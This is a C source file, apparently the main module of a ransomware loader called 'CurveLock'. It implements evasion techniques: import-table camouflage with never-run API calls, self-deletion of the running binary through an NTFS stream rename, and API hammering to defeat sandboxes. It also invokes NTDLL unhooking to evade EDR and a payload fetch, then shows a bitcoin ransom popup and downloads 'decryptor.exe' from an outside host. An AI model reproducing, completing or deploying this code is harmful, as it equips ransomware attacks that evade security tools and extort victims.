#include <Windows.h>
#include <stdio.h>
#include "common.h"
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

// Generate a random seed at compile time
int RandomCompileTimeSeed(void)
{
	return '0' * -40271 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
}

// Helper function that allocates a buffer and returns its base address
PVOID Helper(PVOID* ppAddress) {

	// Allocating a buffer of 0xFF bytes
	PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
	if (!pAddress)
		return NULL;

	// setting the first 4 bytes in pAddress to be equal to a random number (less than 255)
	*(int*)pAddress = RandomCompileTimeSeed() % 0xFF;

	// saving the base address by pointer, and returning it 
	*ppAddress = pAddress;
	return pAddress;
}


// Function that imports WinAPIs but never uses them
VOID IatCamouflage() {

	PVOID		pAddress = NULL;
	int* A = (int*)Helper(&pAddress);

	// Impossible if-statement that will never run
	if (*A > 350) {

		// some random whitelisted WinAPIs
		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
		i = GetLastError();
		i = SetCriticalSectionSpinCount(NULL, NULL);
		i = GetWindowContextHelpId(NULL);
		i = GetWindowLongPtrW(NULL, NULL);
		i = RegisterClassW(NULL);
		i = IsWindowVisible(NULL);
		i = ConvertDefaultLocale(NULL);
		i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
		i = IsDialogMessageW(NULL, NULL);
	}

	// Freeing the buffer allocated in 'Helper'
	HeapFree(GetProcessHeap(), 0, pAddress);
}

//Function to delete the binary
BOOL DeleteSelf() {


	WCHAR                       szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO       Delete = { 0 };
	HANDLE                      hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO           pRename = NULL;
	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
	SIZE_T			            StreamLength = wcslen(NewStream) * sizeof(wchar_t);
	SIZE_T                      sRename = sizeof(FILE_RENAME_INFO) + StreamLength;


	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Cleaning up some structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	//----------------------------------------------------------------------------------------
	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
	Delete.DeleteFile = TRUE;

	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pRename->FileNameLength = StreamLength;
	RtlCopyMemory(pRename->FileName, NewStream, StreamLength);

	//----------------------------------------------------------------------------------------

	// Used to get the current file name
	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	//----------------------------------------------------------------------------------------
	// RENAMING

	// Opening a handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);

	// Renaming the data stream
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
		printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	//----------------------------------------------------------------------------------------
	// DELETING

	// Opening a new handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[i] DELETING ...\n");

	// Marking for deletion after the file's handle is closed
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
		printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	//----------------------------------------------------------------------------------------

	// Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}

// Function to perform API hammering for anti-VM measures
BOOL ApiHammering(DWORD dwStress) {

	WCHAR     szPath[MAX_PATH * 2],
		      szTmpPath[MAX_PATH];
	HANDLE    hRFile = INVALID_HANDLE_VALUE,
		      hWFile = INVALID_HANDLE_VALUE;

	DWORD   dwNumberOfBytesRead = NULL,
		    dwNumberOfBytesWritten = NULL;

	PBYTE   pRandBuffer = NULL;
	SIZE_T  sBufferSize = 0xFFFFF;	// 1048575 byte

	INT     Random = 0;

	// Getting the tmp folder path
	if (!GetTempPathW(MAX_PATH, szTmpPath)) {
		printf("[!] GetTempPathW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Constructing the file path 
	wsprintfW(szPath, L"%s%s", szTmpPath, TMPFILE);

	for (SIZE_T i = 0; i < dwStress; i++) {

		// Creating the file in write mode
		if ((hWFile = CreateFileW(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
			printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// Allocating a buffer and filling it with a random value
		pRandBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufferSize);
		srand(time(NULL));
		Random = rand() % 0xFF;
		memset(pRandBuffer, Random, sBufferSize);

		// Writing the random data into the file
		if (!WriteFile(hWFile, pRandBuffer, sBufferSize, &dwNumberOfBytesWritten, NULL) || dwNumberOfBytesWritten != sBufferSize) {
			printf("[!] WriteFile Failed With Error : %d \n", GetLastError());
			printf("[i] Written %d Bytes of %d \n", dwNumberOfBytesWritten, sBufferSize);
			return FALSE;
		}

		// Clearing the buffer & closing the handle of the file
		RtlZeroMemory(pRandBuffer, sBufferSize);
		CloseHandle(hWFile);

		// Opening the file in read mode & delete when closed
		if ((hRFile = CreateFileW(szPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
			printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// Reading the random data written before 	
		if (!ReadFile(hRFile, pRandBuffer, sBufferSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != sBufferSize) {
			printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
			printf("[i] Read %d Bytes of %d \n", dwNumberOfBytesRead, sBufferSize);
			return FALSE;
		}

		// Clearing the buffer & freeing it
		RtlZeroMemory(pRandBuffer, sBufferSize);
		HeapFree(GetProcessHeap(), NULL, pRandBuffer);

		// Closing the handle of the file - deleting it
		CloseHandle(hRFile);
	}


	return TRUE;
}

// Function to ask user to payup
void ShowDownloadPopup() {

	// Initial message box asking the user to pay up
	int msgboxID = MessageBox(
		NULL,
		L"Your data has been encrypted. In order to decrypt your data, Pay 1000 bitcoins to the following tor link - <Example Tor link>. \n \t Click Ok To Continue",
		L"CurveLock",
		MB_ICONINFORMATION | MB_OKCANCEL
	);
	// Downloading Decryptor.exe from the site
	if (msgboxID == IDOK) {
		HRESULT hr = URLDownloadToFile(
			NULL,
			L"http://www.curvelock.site/decryptor.exe",
			L"decryptor.exe",
			0,
			NULL
		);

		// Message box to inform the user if the decryptor download was successful
		if (SUCCEEDED(hr)) {
			MessageBox(
				NULL,
				L"The decryptor has been downloaded successfully.",
				L"CurveLock",
				MB_ICONINFORMATION | MB_OK
			);
		}

		// Message box to inform the user if the decryptor download failed
		else {
			MessageBox(
				NULL,
				L"Failed to download the decryptor.",
				L"CurveLock",
				MB_ICONERROR | MB_OK
			);
		}
	}
}

int main() {

	DWORD dwThreadId = NULL;

	// Create a thread to run the API hammering function in the background
	if (!CreateThread(NULL, NULL, ApiHammering, -1, NULL, &dwThreadId)) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] Thread %d Was Created To Run ApiHammering In The Background\n", dwThreadId);

	//Delete the binary
	if (!DeleteSelf()) {
		printf("[!] Failed To Delete Self Binary \n");
	}
	
	//Initiate IAT camouflage
	IatCamouflage();
	printf("[+] IAT Camouflage Done \n");
    
	// Unhook NTDLL for EDR Evasion
	if (!UnhookNtDLL()) {
		printf("[!] Failed To Unhook NTDLL \n");
	}

	//Fetching payload
	if (!fetchPayload()) {
		printf("[!] Failed To Fetch Payload \n");
	}

	// Ask the user to pay up
	ShowDownloadPopup();
	
	return 0;
}